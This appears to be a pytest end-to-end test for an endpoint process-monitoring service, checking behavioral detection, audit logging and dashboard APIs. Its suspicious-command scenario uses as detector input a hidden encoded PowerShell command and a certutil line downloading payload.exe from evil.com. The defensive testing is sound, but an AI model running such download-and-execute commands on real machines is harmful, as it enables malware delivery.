import pytest
from fastapi.testclient import TestClient
from app.main import app
from app.db.session import SessionLocal
from app.models.device import Device, DeviceStatus, OSType
from app.models.process_info import ProcessInfo
from app.models.process_audit_log import ProcessAuditLog, ProcessEventType
from app.models.alert import Alert
from app.schemas.process import ProcessInfoCreate, ProcessBatchIngestRequest, ProcessEventDiffPayload
from app.services.process_service import ingest_processes, process_live_events, get_process_audit_logs

client = TestClient(app)


def test_day9_e2e_phase8_scenario_validation():
    """
    End-to-End Validation Suite for Day 9 — Process Monitoring & Behavioral Detection.
    Validates:
    1. Normal applications (No threat triggered)
    2. High CPU process ingestion & telemetry
    3. Suspicious command-line arguments (PowerShell / LOLBin rules)
    4. Parent-child process execution chain detection
    5. Process termination & audit logging
    6. Dashboard API updates & endpoints
    """
    db = SessionLocal()
    try:
        # Create test endpoint device
        device = Device(
            hostname="e2e-day9-endpoint",
            ip_address="192.168.1.150",
            mac_address="AA:BB:CC:11:22:33",
            os_type=OSType.WINDOWS,
            status=DeviceStatus.ONLINE
        )
        db.add(device)
        db.commit()
        db.refresh(device)

        # ----------------------------------------------------
        # Scenario 1: Normal Applications Ingestion
        # ----------------------------------------------------
        normal_procs = [
            ProcessInfoCreate(
                pid=100,
                ppid=1,
                name="explorer.exe",
                exe_path="C:\\Windows\\explorer.exe",
                username="user1",
                cpu_percent=1.2,
                memory_percent=2.5
            ),
            ProcessInfoCreate(
                pid=101,
                ppid=100,
                name="chrome.exe",
                exe_path="C:\\Program Files\\Google\\Chrome\\chrome.exe",
                username="user1",
                cpu_percent=3.4,
                memory_percent=4.1
            )
        ]
        ingest_processes(db=db, device_id=device.id, processes_in=normal_procs)

        # Verify no alerts were created for normal processes
        initial_alerts = db.query(Alert).filter(Alert.device_id == device.id).all()
        assert len(initial_alerts) == 0

        # ----------------------------------------------------
        # Scenario 2: High CPU Process Telemetry
        # ----------------------------------------------------
        high_cpu_proc = ProcessInfoCreate(
            pid=500,
            ppid=100,
            name="ffmpeg.exe",
            exe_path="C:\\Tools\\ffmpeg.exe",
            username="user1",
            cpu_percent=92.5,
            memory_percent=12.0
        )
        ingest_processes(db=db, device_id=device.id, processes_in=[high_cpu_proc], clear_existing=False)

        active_procs = db.query(ProcessInfo).filter(ProcessInfo.device_id == device.id).all()
        ffmpeg_item = next((p for p in active_procs if p.pid == 500), None)
        assert ffmpeg_item is not None
        assert ffmpeg_item.cpu_percent == 92.5

        # ----------------------------------------------------
        # Scenario 3: Suspicious Command-Line Arguments
        # ----------------------------------------------------
        suspicious_procs = [
            ProcessInfoCreate(
                pid=666,
                ppid=100,
                name="powershell.exe",
                exe_path="C:\\Windows\\System32\\powershell.exe",
                username="SYSTEM",
                cmdline="powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="
            ),
            ProcessInfoCreate(
                pid=777,
                ppid=100,
                name="certutil.exe",
                exe_path="C:\\Windows\\System32\\certutil.exe",
                username="SYSTEM",
                cmdline="certutil.exe -urlcache -f http://evil.com/payload.exe C:\\temp\\payload.exe"
            )
        ]
        ingest_processes(db=db, device_id=device.id, processes_in=suspicious_procs, clear_existing=False)

        alerts_after_susp = db.query(Alert).filter(Alert.device_id == device.id).all()
        assert len(alerts_after_susp) >= 2
        alert_titles = [a.title for a in alerts_after_susp]
        assert any("powershell.exe" in t for t in alert_titles)
        assert any("certutil.exe" in t for t in alert_titles)

        # ----------------------------------------------------
        # Scenario 4: Parent-Child Chain Detection
        # ----------------------------------------------------
        chain_procs = [
            ProcessInfoCreate(
                pid=1000,
                ppid=1,
                name="winword.exe",
                exe_path="C:\\Program Files\\Microsoft Office\\winword.exe",
                username="user1"
            ),
            ProcessInfoCreate(
                pid=1001,
                ppid=1000,
                name="cmd.exe",
                exe_path="C:\\Windows\\System32\\cmd.exe",
                username="user1",
                cmdline="cmd.exe /c calc.exe"
            )
        ]
        ingest_processes(db=db, device_id=device.id, processes_in=chain_procs, clear_existing=False)

        parent_child_alerts = db.query(Alert).filter(
            Alert.device_id == device.id,
            Alert.message.contains("winword.exe")
        ).all()
        assert len(parent_child_alerts) >= 1

        # ----------------------------------------------------
        # Scenario 5: Live Process Termination & Audit Logging
        # ----------------------------------------------------
        diff_event = ProcessEventDiffPayload(
            created=[],
            terminated=[
                ProcessInfoCreate(
                    pid=1001,
                    ppid=1000,
                    name="cmd.exe"
                )
            ],
            long_running=[],
            total_active=5
        )
        process_live_events(db=db, device_id=device.id, events=diff_event)

        # Verify process 1001 is deleted from ProcessInfo
        terminated_item = db.query(ProcessInfo).filter(
            ProcessInfo.device_id == device.id,
            ProcessInfo.pid == 1001
        ).first()
        assert terminated_item is None

        # Verify audit log for PROCESS_TERMINATED exists
        term_logs = get_process_audit_logs(
            db=db,
            device_id=device.id,
            event_type=ProcessEventType.PROCESS_TERMINATED,
            pid=1001
        )
        assert len(term_logs) >= 1
        assert term_logs[0].process_name == "cmd.exe"

        # ----------------------------------------------------
        # Scenario 6: Dashboard Endpoints API Updates
        # ----------------------------------------------------
        # Test GET /api/v1/processes
        resp_procs = client.get(f"/api/v1/processes?device_id={device.id}")
        assert resp_procs.status_code == 200
        proc_list = resp_procs.json()
        assert isinstance(proc_list, list)

        # Test GET /api/v1/processes/audit-logs
        resp_audit = client.get(f"/api/v1/processes/audit-logs?device_id={device.id}")
        assert resp_audit.status_code == 200
        audit_list = resp_audit.json()
        assert isinstance(audit_list, list)
        assert len(audit_list) >= 1

    finally:
        db.close()
